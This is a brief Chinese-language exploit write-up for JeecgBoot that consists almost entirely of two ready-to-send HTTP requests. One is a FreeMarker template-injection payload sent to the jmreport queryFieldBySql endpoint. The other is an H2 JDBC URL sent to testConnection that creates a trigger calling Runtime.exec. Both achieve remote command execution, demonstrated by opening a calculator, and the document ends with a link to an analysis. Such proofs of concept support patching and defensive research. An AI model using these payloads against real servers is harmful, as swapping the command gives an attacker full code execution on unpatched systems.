## JeecgBoot sql注入漏洞
```
POST /jeecg-boot/jmreport/queryFieldBySql HTTP/1.1
Host: 192.168.90.1:3100
Origin: http://192.168.90.1:3100
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/json
Content-Length: 123

{"sql":"select 'result:<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"open -a calculator.app  \") }' "}
```

## JeecgBoot SSTI 漏洞
```
POST /jeecgboot/jmreport/testConnection HTTP/1.1
Host: 192.168.90.1:3100
Content-Length: 383
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
Content-Type: application/json;charset=UTF-8
Origin: http://192.168.90.1:3100
Referer: http://192.168.90.1:3100/login?redirect=/dashboard/analysis
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

{
  "id": "1",
  "code": "dataSource1",
  "dbType": "H2",
  "dbDriver": "org.h2.Driver",
  "dbUrl": "jdbc:h2:mem:test;init=CREATE TRIGGER shell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\u000A\u0009java.lang.Runtime.getRuntime().exec('open -a calculator.app')\u000A$$",
  "dbName": "test",
  "dbUsername": "sa",
  "dbPassword": "",
  "connectTimes": 5
}

```
## 漏洞分析
https://c0olw.github.io/2023/08/15/JeecgBoot-SSTI%E4%BB%A5%E5%8F%8AJDBC-RCE/
